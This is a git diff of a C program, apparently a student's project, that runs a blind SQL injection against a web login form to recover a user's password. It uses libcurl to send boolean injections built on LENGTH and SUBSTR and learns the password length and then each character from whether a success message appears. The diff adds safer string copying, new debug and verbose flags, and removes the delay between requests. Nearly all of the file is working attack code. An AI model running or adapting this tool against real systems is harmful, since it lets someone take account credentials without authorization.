@@ -1,6 +1,12 @@
 /************************************************************************************************
 *
-* Author       : Caille Jimmy, ICT student in Telecomunication Networks and Information Security
+* Description  : SQL Injection tool to recover an user's password.
+*                It uses the following injection methods in the $login_form field :
+*                "$login_form=$usr_name' AND LENGTH($pwd_col)=i;"        to recover pwd len
+*                "$login_form=$usr_name' AND SUBSTR($pwd_col,i,1)='$c';" to recover each char
+* 
+* Author       : Caille Jimmy, MSE-ICT student in Telecomunication Networks and Information Security
+* 
 * Prerequisite : install libcurl-dev
 * Compile      : gcc attack.c -o attack -lcurl -Wall -Wextra
 * Usage        : ./attack -h
@@ -21,9 +27,19 @@
 * License      : Unlicense, for more information, please refer to <https://unlicense.org>
 *
 * Version      : v0.2 - attacking multiple usernames
-*                v0.3 - parameters added, multiple username removed
+*                v0.3 - parameters added, multiple username removed, cleanup
+*                v0.4 - strcpy replaced by strncpy for safely copying parameters
+*                       sprintf replaced by snprtinf
+*                       differentiates -v verbose   (shows requests)
+*                                      -r responses (shows html)
+*                                      -d libcurl debug
+*                       help displayed when unknown parameter is given
 *
 *************************************************************************************************/
+
+#define STR_MAX_LEN   100
+#define REQ_CONT_TYPE "Content-Type: application/x-www-form-urlencoded"
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h> //boolean
@@ -38,17 +54,19 @@
 CURL *curl;
 CURLcode res;
 struct string s;
-bool verbose=false;
-char url[50]       ;            //stores the URL to attack
-char username[50]  ="admin";    //stores the username
-char username_f[50]="login";    //stores the username form field
-char pwd_d[50]     ="password"; //stores the password DB field
-char pwd_i[50]     ="password"; //stores the password form field
-char success[50]   ="Welcome";  //stores the success message
-int pwd_min=1;
-int pwd_max=20;
+char url[STR_MAX_LEN];                   //stores the URL to attack
+char username[STR_MAX_LEN]  ="admin";    //stores the username
+char username_f[STR_MAX_LEN]="login";    //stores the username form field
+char pwd_d[STR_MAX_LEN]     ="password"; //stores the password DB field
+char pwd_i[STR_MAX_LEN]     ="password"; //stores the password form field
+char success[STR_MAX_LEN]   ="Welcome";  //stores the success message
+int pwd_min =1;
+int pwd_max =20;
 int char_min=32;
 int char_max=126;
+bool verbose   =false;
+bool responses =false;
+bool curl_debug=false;
 
 //main program
 int main(int argc, char* argv[]){
@@ -56,38 +74,22 @@ int main(int argc, char* argv[]){
   int opt; 
   //parsing arguments
   //info: start with ':' to distinguish between '?' and ':' 
-  while((opt = getopt(argc, argv, ":hvU:u:f:p:P:m:M:c:C:s:")) != -1){  
+  while((opt = getopt(argc, argv, ":hvrdU:u:f:p:P:m:M:c:C:s:")) != -1){  
     switch(opt){
-      case 'h':
-        printf("      [param] [remark]            [default value] \n");
-        printf("Usage:  -h    help, this message  -none-\n");
-        printf("        -U    URL, necessary !    -none-\n");
-        printf("        -u    username            %s\n",username);
-        printf("        -f    username field name %s\n",username_f);
-        printf("        -p    password DB name    %s\n",pwd_d);
-        printf("        -P    password field name %s\n",pwd_i);
-        printf("        -m    password min len    %d\n",pwd_min);
-        printf("        -M    password max len    %d\n",pwd_max);
-        printf("        -c    char min (decimal)  '%c' (%d)\n",char_min,char_min);
-        printf("        -C    char max (decimal)  '%c' (%d)\n",char_max,char_max);
-        printf("        -s    success message     %s\n",success);
-        printf("        -v    verbose             disabled\n");
-        exit(EXIT_SUCCESS);
-      break;
       case 'U':
-        strcpy(url,optarg);
+        strncpy(url,optarg,STR_MAX_LEN);
       break;
       case 'u':
-        strcpy(username,optarg);
+        strncpy(username,optarg,STR_MAX_LEN);
       break;
       case 'f':
-        strcpy(username_f,optarg);
+        strncpy(username_f,optarg,STR_MAX_LEN);
       break;
       case 'p':
-        strcpy(pwd_d,optarg);
+        strncpy(pwd_d,optarg,STR_MAX_LEN);
       break;
       case 'P':
-        strcpy(pwd_i,optarg);
+        strncpy(pwd_i,optarg,STR_MAX_LEN);
       break;
       case 'm':
         pwd_min = atoi(optarg);
@@ -102,21 +104,44 @@ int main(int argc, char* argv[]){
         char_max = atoi(optarg);
       break;
       case 's':
-        strcpy(success,optarg);
+        strncpy(success,optarg,STR_MAX_LEN);
       break;
       case 'v':
         verbose = true;
+      break;
+      case 'r':
+        responses = true;
+      break;
+      case 'd':
+        curl_debug = true;
       break;
       case ':':  
         printf("option needs a value\n");  
       break;
       case '?':
-        printf("unknown option: %c\n", optopt); 
+        printf("unknown option: %c\n", optopt);
+      case 'h':
+        printf("      [param] [remark]            [default value] \n");
+        printf("Usage:  -h    help, this message  -none-\n");
+        printf("        -U    URL, necessary !    -none-\n");
+        printf("        -u    username            %s\n",username);
+        printf("        -f    username field name %s\n",username_f);
+        printf("        -p    password DB name    %s\n",pwd_d);
+        printf("        -P    password field name %s\n",pwd_i);
+        printf("        -m    password min len    %d\n",pwd_min);
+        printf("        -M    password max len    %d\n",pwd_max);
+        printf("        -c    char min (decimal)  '%c' (%d)\n",char_min,char_min);
+        printf("        -C    char max (decimal)  '%c' (%d)\n",char_max,char_max);
+        printf("        -s    success message     %s\n",success);
+        printf("        -v    verbose             disabled\n");
+        printf("        -r    html responses      disabled\n");
+        printf("        -d    libcurl debug       disabled\n");
+        exit(EXIT_SUCCESS);
       break;
     }  
   }
   if(strcmp(url,"")==0){
-    printf("No URL set !\nPlease enter one with -U parameter\n");
+    printf("No URL set !\nPlease enter one with -U parameter\nExiting...\n");
     exit(EXIT_FAILURE);
   }
 
@@ -145,12 +170,12 @@ int main(int argc, char* argv[]){
     fflush(stdout);
     
     //wait a bit
-    usleep(200000);//200ms
+    //usleep(100000);//100ms
 
     //parameters building
-    char fields[100];
+    char fields[STR_MAX_LEN];
     
-    sprintf(fields,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",username_f,username,pwd_d,i,pwd_i);
+    snprintf(fields,STR_MAX_LEN,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",username_f,username,pwd_d,i,pwd_i);
 
     if(verbose) printf("%s\n",fields);
     
@@ -163,14 +188,14 @@ int main(int argc, char* argv[]){
   }
   //test if password length was found
   if(pwd_len==0){
-    fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\n");
+    fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\nExiting...\n");
     exit(EXIT_FAILURE);
   }
   
   //reserve space for password if size found
   cracked = calloc(pwd_len,sizeof(char));
   if(cracked == NULL){
-    fprintf(stderr, "malloc() failed\n");
+    fprintf(stderr, "\nmalloc() failed\nExiting...\n");
     cleanup();
     exit(EXIT_FAILURE);
   }
@@ -197,26 +222,21 @@ int main(int argc, char* argv[]){
       //print current char
       printf("%c",i);
       fflush(stdout);
-      //convert number to char for parameter
-      /*
-      char number[3];
-      sprintf(number,"%d",j);
-      */
       //get corresponding char
       char ch[2];
       sprintf(ch, "%c", i);
 
       //parameters building
-      char fields[100];
+      char fields[STR_MAX_LEN];
       
-      sprintf(fields,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",username_f,username,pwd_d,j,ch,pwd_i);
+      snprintf(fields,STR_MAX_LEN,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",username_f,username,pwd_d,j,ch,pwd_i);
 
       if(verbose) printf("%s\n",fields);
 
       if(doRequest(fields)){
         found = true;
         printf(" FOUND!\n");
-        //add char to password
+        //add char to password, normally no risk as its space is reserved
         if(j==char_min){
           strcpy(cracked,ch);
         }else{
@@ -227,7 +247,7 @@ int main(int argc, char* argv[]){
     }
     //test if char was found
     if(!found){
-      fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\n");
+      fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\nExiting...\n");
       cleanup();
       exit(EXIT_FAILURE);
     }
@@ -271,7 +291,7 @@ void init_string(struct string *s) {
   s->len = 0;
   s->ptr = malloc(s->len+1);
   if(s->ptr == NULL){
-    fprintf(stderr, "malloc() failed\n");
+    fprintf(stderr, "\nmalloc() failed\nExiting...\n");
     cleanup();
     exit(EXIT_FAILURE);
   }
@@ -283,7 +303,7 @@ size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s){
   size_t new_len = s->len + size*nmemb;
   s->ptr = realloc(s->ptr, new_len+1);
   if (s->ptr == NULL) {
-    fprintf(stderr, "realloc() failed\n");
+    fprintf(stderr, "\nrealloc() failed\nExiting...\n");
     cleanup();
     exit(EXIT_FAILURE);
   }
@@ -307,7 +327,7 @@ int doRequest(char* params){
   if(curl){
     init_string(&s);
     //debug
-    //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
+    if(curl_debug) curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
     //set function to handle response
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
     //set string to save response
@@ -318,7 +338,7 @@ int doRequest(char* params){
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params);
     //set content type
     struct curl_slist *hs=NULL;
-    hs = curl_slist_append(hs, "Content-Type: application/x-www-form-urlencoded");
+    hs = curl_slist_append(hs, REQ_CONT_TYPE);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
     //set request type
     curl_easy_setopt(curl, CURLOPT_POST, 1);
@@ -326,11 +346,11 @@ int doRequest(char* params){
     res = curl_easy_perform(curl);
     //check for errors
     if(res != CURLE_OK){
-      fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
+      fprintf(stderr, "\ncurl_easy_perform() failed: %s\nExiting...\n",curl_easy_strerror(res));
       cleanup();
       exit(EXIT_FAILURE);
     }
-    if(verbose) printf("%s\n", s.ptr);
+    if(responses) printf("%s\n", s.ptr);
     //verify response
     if(strstr(s.ptr, success) != NULL){
       if(s.ptr){
@@ -346,7 +366,7 @@ int doRequest(char* params){
       return 0;
     }
   }else{
-    fprintf(stderr, "curl_global_init() failed\n");
+    fprintf(stderr, "\ncurl_global_init() failed\nExiting...\n");
     cleanup();
     exit(EXIT_FAILURE);
   }
